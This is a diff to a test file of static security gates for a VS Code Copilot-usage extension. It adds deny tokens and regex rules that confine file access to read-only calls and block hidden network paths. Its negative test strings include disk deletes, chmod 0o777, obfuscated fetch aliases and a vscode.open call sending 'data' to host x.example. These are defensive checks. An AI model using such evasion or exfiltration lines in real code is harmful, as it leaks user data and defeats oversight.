@@ -37,8 +37,55 @@ const TOKENS = [
   // D31 side bar and D33 status bar (F4 V1–V3): no trusted Markdown, no paths from log data.
   "isTrusted = true", "isTrusted: true", "enabledCommands", "supportHtml = true", "supportHtml: true",
   "resourceUri", "registerWebviewViewProvider",
+  // HOST-1: the rest of the fs mutating family, by name (call- or member-shaped where the bare word is prose)
+  "writeSync", "writev", "rmdir", ".rm(", "rmSync", "truncateSync", ".truncate(", "ftruncate",
+  "symlinkSync", ".symlink(", "linkSync", ".link(", "cpSync", ".cp(", "chmod", "chown", "utimes", "mkdtemp",
+  "openSync", "O_WRONLY", "O_RDWR", "O_CREAT", "O_TRUNC", "O_APPEND", "fs/promises",
+  // HOST-1: fetch reached without the one literal `fetch(` call
+  "globalThis",
 ];
 const DYNAMIC_REQUIRE = /\brequire\(\s*(?!["'])/;
+/**
+ * HOST-1: shape rules beside the tokens. The tree touches fs only as `import * as fs from "node:fs"`
+ * (bundled as `var fsN = __toESM(require("node:fs"))`), through `fs.promises.{lstat,stat,readdir,open}`,
+ * read-only `fs.constants.O_*` flags and the `Dirent`/`Stats`/`FileHandle` types; the one command it
+ * runs is the Settings editor; fetch is only ever called directly.
+ */
+/** FIN-1: the read-only open flags, `fs` or a bundled `fsN`, as tailer.ts and copilot.ts spell them. */
+const RO_FLAGS = (g: string) =>
+  String.raw`(?<${g}>fs\d*)\.constants\.O_RDONLY\s*\|\s*\(\s*\k<${g}>\.constants\.O_NOFOLLOW\s*\?\?\s*0\s*\)\s*\|\s*\(\s*\k<${g}>\.constants\.O_NONBLOCK\s*\?\?\s*0\s*\)`;
+/**
+ * FIN-1: every `promises.open(` must be one of the tree's two calls, whole argument list up to the
+ * closing paren: tailer.ts `(this.path, OPEN_FLAGS)` or copilot.ts `(<identifier>, <RO_FLAGS>)`.
+ */
+const OPEN_CALL = new RegExp(
+  String.raw`\bpromises\s*\.\s*open\s*\((?!\s*this\.path\s*,\s*OPEN_FLAGS\s*,?\s*\)|\s*[A-Za-z_$][\w$]*\s*,\s*${RO_FLAGS("f")}\s*,?\s*\))`,
+);
+/** FIN-1: `OPEN_FLAGS` is trusted by name in OPEN_CALL, so its declarations are pinned: the read-only expression, once. */
+const OPEN_FLAGS_DECL = /\bOPEN_FLAGS\s*=(?!=)/g;
+const OPEN_FLAGS_RO = new RegExp(String.raw`^\s*(?:const|var|let) OPEN_FLAGS = ${RO_FLAGS("d")};\s*$`, "m");
+/** Problems with the `OPEN_FLAGS` declarations in a text: none allowed unless `declares`, then exactly one, read-only. */
+function openFlagsOffences(text: string, declares: boolean): string[] {
+  const n = text.match(OPEN_FLAGS_DECL)?.length ?? 0;
+  if (!declares) return n === 0 ? [] : [`OPEN_FLAGS declared ${n}x`];
+  if (n !== 1) return [`OPEN_FLAGS declared ${n}x, want 1`];
+  return OPEN_FLAGS_RO.test(text) ? [] : ["OPEN_FLAGS is not the read-only expression"];
+}
+const SHAPES: [string, RegExp][] = [
+  ["fs member outside the read-only set", /\bfs\d*\s*\.\s*(?!(?:promises|Dirent|Stats)\b|constants\s*\.\s*O_(?:RDONLY|NOFOLLOW|NONBLOCK)\b)\w+/],
+  ["fs.promises member outside the read-only set", /\bpromises\s*\.\s*(?!(?:lstat|stat|readdir|open|FileHandle)\b)\w+/],
+  ["fs.promises.open( other than the two read-only calls", OPEN_CALL],
+  ["fs.promises taken as a value", /\bfs\d*\s*\.\s*promises\b(?!\s*\.)/],
+  ["fs imported other than as `fs`", /import\s*(?:\{[^}]*\}|\*\s*as\s+(?!fs\b)\w+|(?!fs\b)\w+)\s*from\s*["'](?:node:)?fs["']|(?<!\bfs\d* = __toESM\()require\(\s*["'](?:node:)?fs["']/],
+  ["promises taken out of fs", /\{[^{}]*\bpromises\b[^{}]*\}\s*=(?!=)/],
+  ["computed member call with a literal key", /\[\s*(?:"[^"]*"|'[^']*'|`[^`]*`)\s*\]\s*\(/],
+  ["computed access on fs, commands or settings", /\b(?:fs\d*|promises|commands|vscode\d*|workspace)\s*\[|getConfiguration\([^)]*\)\s*\[/],
+  ["bracketed fetch/update/executeCommand", /\[\s*["'`](?:fetch|update|executeCommand)["'`]\s*\]/],
+  ["executeCommand other than the Settings editor", /executeCommand(?!\(\s*["']workbench\.action\.openSettings["'])/],
+  ["fetch used as a value", /(?:[=(,:?[]|\breturn|=>)\s*fetch\b(?!\s*\()|\{[^{}]*\bfetch\b[^{}]*\}\s*=(?!=)|\bfetch\s*\.\s*(?:call|apply|bind)\b|\b(?:self|global)\s*[.[]/],
+];
+/** HOST-1: a bracketed `update` access, the settings write the `.update(` gate cannot see. */
+const COMPUTED_UPDATE = /\[\s*["'`]update["'`]\s*\]/g;
 
 /** A1: the side bar is the one webview view; `registerWebviewViewProvider` may appear
  * once, in src/vscode/sidebar.ts (and so once in the bundle), nowhere else. */
@@ -51,6 +98,7 @@ function offences(source: string, allowWebviewView = false): string[] {
   for (const t of TOKENS) if (source.includes(t)) found.push(t);
   if (allowWebviewView && source.split(WEBVIEW_VIEW).length === 2) found.splice(found.indexOf(WEBVIEW_VIEW), 1);
   if (DYNAMIC_REQUIRE.test(source)) found.push("dynamic require");
+  for (const [name, re] of SHAPES) if (re.test(source)) found.push(`${name}: ${re.exec(source)![0]}`);
   return found;
 }
 
@@ -231,6 +279,69 @@ describe("gates", () => {
     expect(offences("vscode.window.registerWebviewViewProvider(id, p);")).toContain(WEBVIEW_VIEW);
     expect(offences("registerWebviewViewProvider(a); registerWebviewViewProvider(b);", true)).toContain(WEBVIEW_VIEW);
     expect(offences("vscode.window.registerWebviewViewProvider(id, p);", true)).toEqual([]);
+    // HOST-1: disk writes and deletes by other fs spellings
+    const bad = [
+      'const fd = fs.openSync(p, "w"); fs.writeSync(fd, d);',
+      "await fs.promises.rm(p);",
+      "fs.rmdirSync(p);",
+      "await fs.promises.truncate(p, 0);",
+      "fs.ftruncateSync(fd);",
+      "fs.symlinkSync(a, b);",
+      "await fs.promises.link(a, b);",
+      "fs.cpSync(a, b);",
+      "await fs.promises.cp(a, b);",
+      "fs.chmodSync(p, 0o777);",
+      "await fs.promises.utimes(p, t, t);",
+      'const h = await fs.promises.open(p, "w");',
+      'const h = await fs.promises.open(p, "a+");',
+      'const h = await fs.promises.open(p, "r+");',
+      "const h = await fs.promises.open(p, mode);",
+      "const h = await fs.promises.open(p, fs.constants.O_WRONLY | fs.constants.O_CREAT);",
+      'import { writeSync } from "node:fs";',
+      'import * as fsp from "node:fs/promises";',
+      'import * as disk from "node:fs"; disk.writeSync(1, "x");',
+      "const { promises } = fs; promises.rm(p);",
+      'fs[op](p, d);',
+      // HOST-1: a second network path through VS Code commands
+      'void vscode.commands.executeCommand("vscode.open", vscode.Uri.from({ scheme: "https", authority: "x.example", path: "/", query: data }));',
+      "const run = vscode.commands.executeCommand; void run(id, u);",
+      'void vscode.commands["executeCommand"]("vscode.open", u);',
+      // HOST-1: fetch by alias
+      "const get = globalThis.fetch; void get(url);",
+      'const get = globalThis["fe" + "tch"];',
+      "const get = fetch; void get(url);",
+      "call(fetch, url);",
+      "const { fetch: get } = globalThis;",
+      "const o = { get: fetch };",
+      "fetch.call(undefined, url);",
+      'const get = self["fetch"];',
+      // FIN-1: an open is allowed only with one of the two exact argument lists
+      'const h = await fs.promises.open(path.join(dir, name), "w");',
+      'const h = await fs.promises.open(join(a, b), "a+");',
+      "const h = await fs.promises.open(p, fs.constants.O_RDONLY | 1);",
+      "const h = await fs.promises.open(p, OPEN_FLAGS | 0o1);",
+      "const h = await fs.promises.open(this.path, OPEN_FLAGS, 0o644);",
+      'const p = fs.promises; await p.open(x, "w");',
+      "call(fs.promises);",
+      "const o = { p: fs2.promises };",
+    ];
+    for (const s of bad) expect(offences(s), s).not.toEqual([]);
+    // what the current tree legitimately does stays clean
+    for (const s of [
+      "handle = await fs.promises.open(this.path, OPEN_FLAGS);",
+      "const fh = await fs5.promises.open(\n    path,\n    fs5.constants.O_RDONLY | (fs5.constants.O_NOFOLLOW ?? 0) | (fs5.constants.O_NONBLOCK ?? 0),\n  );",
+      "const fh = await fs5.promises.open(\n    path3,\n    fs5.constants.O_RDONLY | (fs5.constants.O_NOFOLLOW ?? 0) | (fs5.constants.O_NONBLOCK ?? 0)\n  );",
+      "let handle: fs.promises.FileHandle | undefined;",
+      "const st = await fs.promises.lstat(p); const e = await fs2.promises.readdir(d, { withFileTypes: true }); (await fs.promises.stat(b)).mtimeMs;",
+      'import * as fs from "node:fs"; var fs3 = __toESM(require("node:fs"));',
+      'void vscode.commands.executeCommand("workbench.action.openSettings", "@ext:local.agentmeter");',
+      'log.error("rate.fetch", "NETWORK"); const tools = ["update_todo", "fetch", "web_fetch"]; const t = "A failed fetch is retried; symlinked folders are refused; text is truncated.";',
+      "const pick = await vscode.window.showQuickPick(items);",
+    ]) expect(offences(s), s).toEqual([]);
+    // HOST-1: a computed settings write is seen by the settings-write gate
+    expect('vscode.workspace.getConfiguration("copilotUsageMonitor")["update"]("currency", "CAD", 1);'.match(COMPUTED_UPDATE)).not.toBeNull();
+    expect("c[`update`](k, v); c['update'](k, v);".match(COMPUTED_UPDATE)).toHaveLength(2);
+    expect("panel.update(model); await c.update(key, value, target);".match(COMPUTED_UPDATE)).toBeNull();
   });
 
   it("no hardcoded home folder", () => {
@@ -368,6 +479,8 @@ describe("gates", () => {
       const rel = f.slice(ROOT.length + 1);
       // a config update with a variable key right on getConfiguration() is refused outright
       expect(src.match(/getConfiguration\([^)]*\)\s*\.update\(\s*[^"\s]/g), rel).toBeNull();
+      // HOST-1: a bracketed `["update"]` is a settings write this gate's `.update(` match cannot see; none is allowed
+      expect(src.match(COMPUTED_UPDATE), rel).toBeNull();
       // every `.update(` that is not a view's (panel, status bar, side bar) is a settings write
       const updates = [...src.matchAll(/(\w+|\))\.update\(\s*([^,)]+)/g)].filter((x) => !/^(panel|status|sidebar|this)$/.test(x[1]!)).map((x) => x[2]!.trim());
       // the helper's one call (its key is typed SettingKey), and the alert's literal "Don't show again" write
@@ -375,6 +488,7 @@ describe("gates", () => {
       else if (rel === ALERT) expect(updates).toEqual(['"targetAlert"']);
       else expect(updates, rel).toEqual([]);
     }
+    expect(readFileSync(join(ROOT, "dist", "extension.js"), "utf8").match(COMPUTED_UPDATE)).toBeNull();
     const ext = readFileSync(join(ROOT, EXT), "utf8");
     const keys = /type SettingKey = ([^;]+);/.exec(ext)![1]!.split("|").map((k) => k.trim().replace(/^"|"$/g, ""));
     expect(keys).toEqual(["display", "currency", "palette", "panelNavCollapsed", "statusBar", "targetAlert", "dailyTargetMax", "weeklyTargetMax", "monthlyTargetMin", "monthlyTargetMax"]);
@@ -517,6 +631,14 @@ describe("gates", () => {
     const src = readFileSync(join(ROOT, "src", "core", "tailer.ts"), "utf8");
     expect(src).toContain("O_NOFOLLOW");
     expect(src).toContain("O_NONBLOCK");
+    // FIN-1: OPEN_CALL trusts the name OPEN_FLAGS, so it is declared once, in tailer.ts, read-only (and so in the bundle)
+    for (const f of files(join(ROOT, "src"), /\.ts$/)) expect(openFlagsOffences(readFileSync(f, "utf8"), f.endsWith(join("core", "tailer.ts"))), f).toEqual([]);
+    expect(openFlagsOffences(readFileSync(join(ROOT, "dist", "extension.js"), "utf8"), true)).toEqual([]);
+    // self-test
+    expect(openFlagsOffences('const OPEN_FLAGS = "w";', false)).not.toEqual([]);
+    expect(openFlagsOffences('const OPEN_FLAGS = "w";', true)).not.toEqual([]);
+    expect(openFlagsOffences("const OPEN_FLAGS = fs.constants.O_RDONLY | (fs.constants.O_NOFOLLOW ?? 0) | (fs.constants.O_NONBLOCK ?? 0) | 1;", true)).not.toEqual([]);
+    expect(openFlagsOffences("var OPEN_FLAGS = fs.constants.O_RDONLY | (fs.constants.O_NOFOLLOW ?? 0) | (fs.constants.O_NONBLOCK ?? 0);", true)).toEqual([]);
   });
 
   it("packaging always rebuilds the bundle first (v0.7)", () => {
@@ -535,6 +657,17 @@ describe("gates", () => {
     expect(readFileSync(join(ROOT, ".github", "ISSUE_TEMPLATE", "bug_report.md"), "utf8")).toContain(`e.g. ${pkg.version}`);
   });
 
+  it("the lockfile and the CHANGELOG's latest release carry package.json's version (GATE-1)", () => {
+    const pkg = JSON.parse(readFileSync(join(ROOT, "package.json"), "utf8"));
+    const lock = JSON.parse(readFileSync(join(ROOT, "package-lock.json"), "utf8"));
+    expect(lock.version).toBe(pkg.version);
+    expect(lock.packages[""].version).toBe(pkg.version);
+    // the first released heading; a "## Unreleased" above it is allowed, not required
+    const released = /^## (\d+\.\d+\.\d+)\b/m.exec(readFileSync(join(ROOT, "CHANGELOG.md"), "utf8"));
+    expect(released, "a released heading in CHANGELOG.md").not.toBeNull();
+    expect(released![1]).toBe(pkg.version);
+  });
+
   it("walkthrough (v0.6, 2.4): four steps, markdown media only, allowlisted command links, no URLs, copy rules", () => {
     const pkg = JSON.parse(readFileSync(join(ROOT, "package.json"), "utf8"));
     const w = pkg.contributes.walkthroughs;
@@ -548,7 +681,7 @@ describe("gates", () => {
       "command:workbench.action.openSettings?%5B%22copilotUsageMonitor.copilotHome%22%5D",
       "command:copilotUsageMonitor.toggleUnit",
       "command:copilotUsageMonitor.selectCurrency",
-      "command:workbench.action.openSettings?%5B%22copilotUsageMonitor.monthlyTarget%22%5D",
+      "command:copilotUsageMonitor.setTarget",
       "command:workbench.view.extension.copilotUsageMonitor",
       "command:copilotUsageMonitor.showDetails",
     ]);
